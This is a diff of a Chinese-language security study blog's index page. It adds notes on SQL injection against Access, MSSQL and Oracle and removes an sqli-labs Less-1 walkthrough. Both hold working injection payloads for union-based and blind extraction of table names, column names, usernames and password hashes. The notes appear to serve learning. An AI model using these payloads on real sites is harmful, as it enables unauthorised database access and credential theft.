@@ -64,6 +64,185 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-SQL注入-Oracle等注入" class="post-SQL注入-Oracle等注入 post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/">SQL注入-Oracle等注入</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/" data-id="ckzcsxa300006wgmadqdyedvi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <p>##数据库注入</p>
+<p>除Access数据库之外，其他类型数据库注入流程：</p>
+<p><img src="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/image-20220207191425163.png" alt="image-20220207191425163"></p>
+<p><strong>什么决定网站注入点的用户权限？</strong></p>
+<p><strong>SQL的配置文件用户名</strong></p>
+<hr>
+<h2 id="Access注入（特殊）"><a href="#Access注入（特殊）" class="headerlink" title="Access注入（特殊）"></a>Access注入（特殊）</h2><p>####Access数据结构</p>
+<p>​               表名</p>
+<p>​                       列名</p>
+<p>​                               数据</p>
+<p><strong>注意</strong>：1、Access数据库只有一个数据库；</p>
+<p>​            2、 <strong>Access数据库只能靠暴力猜解</strong>；</p>
+<p>​            3、 一般Access数据库与ASP网站一起搭建；</p>
+<p>​            4、 Access没有数据库名，没有版本号，统统都没有；</p>
+<p>​            5、 注入的时候无需查询什么版本等等。</p>
+<p>​            6、 access无注释符</p>
+<h4 id="注入方法："><a href="#注入方法：" class="headerlink" title="注入方法："></a>注入方法：</h4><p>1、联合查询法</p>
+<p>2、逐字猜解法（常用）</p>
+<h5 id="联合注入："><a href="#联合注入：" class="headerlink" title="联合注入："></a>联合注入：</h5><p><strong>第一步</strong>：判断注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and 1=1返回正常</span><br><span class="line">?id=1 and 1=2返回错误’</span><br><span class="line">存在注入点。</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步</strong>：判断列的字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3返回正常</span><br><span class="line">?id=1 order by 4返回错误</span><br><span class="line">字段数为3</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步</strong>：猜解表名（判断回显点）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,2,3 from 表名</span><br></pre></td></tr></table></figure>
+
+<p><strong>第四步</strong>：猜解列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,列名一,列名二 from 表名</span><br><span class="line">猜出列名则会返回数据</span><br><span class="line">把上面得到的那两个数字中替换成表中的用户名与密码字段名：</span><br><span class="line">例：username 和 password</span><br></pre></td></tr></table></figure>
+
+<p><strong>第五步</strong>：爆出数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 union select 1,admin,password from 表名</span><br><span class="line">回显点2爆出用户名，回显点3爆出密码</span><br></pre></td></tr></table></figure>
+
+
+
+<p>#####逐字猜解法：（适用于 order by 不能用的地方）</p>
+<p><strong>第一步</strong>：判断注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; 单引号注入</span><br><span class="line">?id=1 and 1=1 数字型注入</span><br></pre></td></tr></table></figure>
+
+<p><strong>第二步</strong>：判断字段数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3返回正常</span><br><span class="line">?id=1 order by 4返回错误</span><br><span class="line">字段数为3</span><br></pre></td></tr></table></figure>
+
+<p><strong>第三步</strong>：猜表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and exists (select * from admin) ——猜表名</span><br></pre></td></tr></table></figure>
+
+<p><strong>第四步</strong>：猜列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and exists (select username/password from admin) ——猜列名</span><br></pre></td></tr></table></figure>
+
+<p><strong>第五步</strong>：猜字段中数据长度（1.确定长度 2.确定asc数据）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select top 1 len(username ) from admin)&gt;5  --判断长度</span><br><span class="line">?id=1 and (select top 1 asc(mid(username ,1,1)) from admin(表名))=97 判断字段第一位(后几位依次类推)</span><br></pre></td></tr></table></figure>
+
+<p>top（附属查询）：</p>
+<p>例：top 1 用来返回第一行的内容（也可以用来限制返回内容的行数）</p>
+<hr>
+<h2 id="MSSQL-SQL-Server-注入"><a href="#MSSQL-SQL-Server-注入" class="headerlink" title="MSSQL(SQL Server)注入"></a>MSSQL(SQL Server)注入</h2><p><strong>常用框架组合方法ASP+MSSQL</strong></p>
+<p>1、判断数据库类型</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">and exists (select * from sysobjects)--返回正常为mssql（也名sql server）</span><br><span class="line">and exists (select count(*) from sysobjects)--有时上面那个语句不行就试试这个</span><br><span class="line">（sysobjects：MSSQL数据库特有的数据表，系统对象表）</span><br><span class="line">（Exists()：子语句查询，Exists方法返回一个布尔值，该布尔值指示在 Dictionary 对象中是否存在指定的 key，如果存在，返回 true，否则返回 false）</span><br></pre></td></tr></table></figure>
+
+<p>2、判断当前数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select db_name(N)  表示当前数据库，其中的参数表示第N个数据库，从0开始</span><br></pre></td></tr></table></figure>
+
+<p>3、查看所有数据库</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SELECT top 1 Name FROM Master..SysDatabases  在系统数据库中能够查询所有的数据库</span><br><span class="line">（Master系统数据库）</span><br></pre></td></tr></table></figure>
+
+<p>4、注入点权限判断（根据页面显示效果）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1 select is_srvrolemember(&#x27;sysadmin&#x27;);判断当前是否为sa</span><br><span class="line">2 select is_srvrolemember(&#x27;db_owner&#x27;);判断当前用户写文件、读文件的权限（db_owner）</span><br><span class="line">3 select is_srvrolemember(&#x27;public&#x27;);  判断是否有public权限，可以爆破表</span><br></pre></td></tr></table></figure>
+
+<p>5、查看数据库版本</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select @@version</span><br></pre></td></tr></table></figure>
+
+<p>6、查询表名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select top 1 name from test.sys.all_objects where type=&#x27;U&#x27; AND is_ms_shipped=0  获取第一个表名</span><br></pre></td></tr></table></figure>
+
+<p>7、查询列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select top 1 COLUMN_NAME from test.information_schema.columns where TABLE_NAME=&#x27;users&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>8、获取字段数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select top 1 username from users</span><br><span class="line">select top 1 password from users</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="Oracle注入"><a href="#Oracle注入" class="headerlink" title="Oracle注入"></a>Oracle注入</h2><p>引导：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">dual表，此表是Oracle数据库中的一个自带表，有说法这是一个虚拟表，也有的说是一个实表，它实际上位满足查询条件而产生</span><br><span class="line"></span><br><span class="line">与MySQL不同的是，在MySQL中查询语句可以直接是：select 1,2，但是在Oracle中就必须跟一个表名，如下：select * from dual</span><br><span class="line"></span><br><span class="line">涉及到的基本用法：</span><br><span class="line"></span><br><span class="line">select * from all_tables 查询出所有的表</span><br><span class="line"></span><br><span class="line">select * from user_tables 查询出当前用户的表</span><br><span class="line"></span><br><span class="line">select * from all_tab_columns 查询出所有的字段</span><br><span class="line"></span><br><span class="line">select * from user_tab_columns  查询出当前用户的字段</span><br><span class="line"></span><br><span class="line">select * from v$version 查版本</span><br><span class="line"></span><br><span class="line">rownum=1   (限制查询返回的总行数为一条)</span><br><span class="line"></span><br><span class="line">对于rownum来说它是oracle系统顺序分配为从查询返回的行的编号，返回的第一行分配的是1，第二行是2，依此类推，这个伪字段可以用于限制查询返回的总行数。</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="注入语句："><a href="#注入语句：" class="headerlink" title="注入语句："></a>注入语句：</h4><p><strong>（Oracle 字符串区分大小写）</strong></p>
+<p>获取数据库版本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">WHERE</span> banner <span class="keyword">LIKE</span> <span class="string">&#x27;Oracle%&#x27;</span>;</span><br><span class="line"><span class="keyword">SELECT</span> version <span class="keyword">FROM</span> v$instance;</span><br></pre></td></tr></table></figure>
+
+<p>获取数据库系统版本：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> banner <span class="keyword">FROM</span> v$version <span class="keyword">where</span> banner <span class="keyword">like</span> <span class="string">&#x27;TNS%&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>获取当前数据库用户：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">user</span> <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="keyword">select</span> SYS_CONTEXT(<span class="string">&#x27;USERENV&#x27;</span>,<span class="string">&#x27;CURRENT_USER&#x27;</span>) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p>获取当前用户权限：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> session_privs;</span><br></pre></td></tr></table></figure>
+
+<p>获取所有数据库用户密码：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> name, password, spare4 <span class="keyword">from</span> sys.user$</span><br></pre></td></tr></table></figure>
+
+<p>获取DB文件路径：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> name <span class="keyword">FROM</span> V$DATAFILE;</span><br></pre></td></tr></table></figure>
+
+<p>列出DBA账户：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> grantee <span class="keyword">FROM</span> dba_sys_privs <span class="keyword">WHERE</span> ADMIN_OPTION <span class="operator">=</span> ‘YES’ </span><br></pre></td></tr></table></figure>
+
+<p>服务器监听IP：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> utl_inaddr.get_host_address <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p>获取当前操作系统：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span>  dbms_utility.port_string <span class="keyword">FROM</span> dual;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">member</span> <span class="keyword">from</span> v$logfile <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>  <span class="operator">/</span><span class="operator">/</span>路径也是可以判断的</span><br></pre></td></tr></table></figure>
+
+<p>获取服务器SID：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> instance_name <span class="keyword">from</span> v$instance</span><br></pre></td></tr></table></figure>
+
+<p>列出数据库：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> owner <span class="keyword">FROM</span> all_tables; — 列出数据库 (一个用户一个)</span><br></pre></td></tr></table></figure>
+
+<p><strong>联合注入语句</strong>：</p>
+<p><strong>（Oracle区分大小写）</strong></p>
+<p>判断字段：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order</span> <span class="keyword">by</span></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="string">&#x27;null&#x27;</span> 根据<span class="string">&#x27;&#x27;</span> 判断哪里是字符串</span><br></pre></td></tr></table></figure>
+
+<p>爆表:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span>) <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> user_tables <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;第一个表&#x27;</span>)) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p>爆字段:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名（大写的）&#x27;</span>) <span class="keyword">from</span> dual</span><br><span class="line"></span><br><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> user_tab_columns <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;表名&#x27;</span> <span class="keyword">and</span> column_name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;第一个字段&#x27;</span>)) <span class="keyword">from</span> dual</span><br></pre></td></tr></table></figure>
+
+<p>爆数据:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,字段<span class="number">1</span><span class="operator">||</span>字段<span class="number">2.</span>..<span class="operator">||</span>字段n <span class="keyword">from</span> 表名 <span class="keyword">where</span> rownum<span class="operator">=</span><span class="number">1</span> <span class="comment">--</span></span><br><span class="line">连接多个字段用到的连接符号是<span class="operator">||</span>,在oracle数据库中，concat函数只能连接两个字符串</span><br></pre></td></tr></table></figure>
+
+<p>通过字段名查找对应的表：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> owner, table_name <span class="keyword">FROM</span> all_tab_columns <span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> <span class="string">&#x27;%USERNAME%&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p>其盲注语句和OOB等，参考文章：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/R0ser1/p/15387539.html">https://www.cnblogs.com/R0ser1/p/15387539.html</a></p>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2022/02/07/SQL%E6%B3%A8%E5%85%A5-Oracle%E7%AD%89%E6%B3%A8%E5%85%A5/">
+    <time datetime="2022-02-07T10:57:10.000Z" class="entry-date">
+        2022-02-07
+    </time>
+</a>
+    
+    
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-POST注入-HTTP头注入" class="post-POST注入-HTTP头注入 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -79,7 +258,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktp0004ncmadxtk58r0" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-HTTP%E5%A4%B4%E6%B3%A8%E5%85%A5/" data-id="ckzcsxa2w0002wgma8vb8g8y8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -257,7 +436,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktp0003ncma5r3n94s9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/POST%E6%B3%A8%E5%85%A5-%E5%9F%BA%E4%BA%8EPassword%E7%9A%84%E6%B3%A8%E5%85%A5/" data-id="ckzcsxa2x0003wgma91bb49wx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -342,7 +521,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckzbhrktq0005ncma6jkp2w1u" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/05/SQL%E6%B3%A8%E5%85%A5-POST%E6%B3%A8%E5%85%A5/" data-id="ckzcsxa320007wgma6x5shjyy" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -500,7 +679,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckzbhrkto0002ncmadzvz543f" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/04/SQL%E6%B3%A8%E5%85%A5-Less8-Less10/" data-id="ckzcsxa2x0004wgma61wk9pzo" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -555,7 +734,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzbhrku7000mncma0itcfa64" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/03/%E6%96%87%E4%BB%B6%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzcsxa3s000nwgma7iu26whs" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -626,7 +805,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzbhrku9000oncmabsjx3jvr" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/%E7%9B%B2%E6%B3%A8-SQL%E9%9D%B6%E5%9C%BA/" data-id="ckzcsxa3u000pwgmaht5l8gsg" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -924,7 +1103,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckzbhrkts0007ncmabx9shlrt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/02/SQL%E6%B3%A8%E5%85%A5-%E7%9B%B2%E6%B3%A8/" data-id="ckzcsxa330008wgma520va90k" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1033,7 +1212,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckzbhrktr0006ncmafbnlaxg9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/02/01/SQL%E6%B3%A8%E5%85%A5-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C/" data-id="ckzcsxa2y0005wgmaf6s39lad" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1119,7 +1298,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckzbhrkts0008ncma98vw95h9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/31/SQL%E6%B3%A8%E5%85%A5%E5%AD%97%E7%AC%A6%E5%9E%8B%E5%92%8C%E6%95%B0%E5%AD%97%E5%9E%8B%E5%88%A4%E6%96%AD/" data-id="ckzcsxa360009wgma0qtv6zlx" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -1241,203 +1420,6 @@
 
 
   
-    <article id="sqli-labs-Less1-Less4" class="sqli-labs-Less1-Less4 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2022/01/30/Less1-Less4/">Less1-Less4</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://noobxw.github.io/2022/01/30/Less1-Less4/" data-id="ckzbhrktm0001ncmae6o7h1op" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>###Less-1（字符型注入）</p>
-<h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>首先注入：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1</span><br></pre></td></tr></table></figure>
-
-<p>正常返回结果</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131000046458.png" alt="image-20220131000046458"></p>
-<p>由于要判断注入点，如图：</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131000327595.png" alt="image-20220131000327595"></p>
-<p>添加 ‘ 报错，证明有注入点，字符型，id=1’报错是由于源码当中接收值的时候本身自己就是id=’’的闭合形式，但由于我们自己强行在输入1的时候添加了1’，导致闭合之后形成了id=’1’’，导致报错。</p>
-<h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>执行下列语句进行绕过：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=1&#x27; or 1=1 --+</span><br></pre></td></tr></table></figure>
-
-<p>此时正常回显</p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001026791.png" alt="image-20220131001026791"></p>
-<h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接下来判断字段数，此处可以利用 order by。Order by 对前面的数据进行排序，这里有三列数据，我们就只能用 order by 3,超过 3 就会报错。 ‘order by 4–+的结果显示结果超出。</p>
-<p>执行以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001526775.png" alt="image-20220131001526775"></p>
-<p><img src="/2022/01/30/Less1-Less4/image-20220131001643103.png" alt="image-20220131001643103"></p>
-<h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>知道字段数之后，判断回显点，利用union联合注入：</p>
-<p>当 id 的数据在数据库中不存在时，（此时我们可以 id=-1，两个 sql 语句进行联合操作时， 当前一个语句选择的内容为空，我们这里就将后面的语句的内容显示出来）此处前台页面返 回了我们构造的 union 的数据。</p>
-<p>执行以下语句：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,2,3 --+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131002543033.png" alt="image-20220131002543033"></p>
-<p>此时执行语句应该为：</p>
-<p>select ************ where id=’-1’ union select 1,2,3–+’ LIMIT 0,1</p>
-<p>回显点为2和3</p>
-<h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>接下来爆当前所在数据库名，爆版本号：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,database(),version()--+</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2022/01/30/Less1-Less4/image-20220131004721237.png" alt="image-20220131004721237"></p>
-<h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>根据版本特性，爆数据库：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://sqli-labs-master/Less-1/?id=-1&#x27; union select 1,schema_name,3  from information_schema.schemata  --+</span><br></pre></td></tr></table></figure>
-
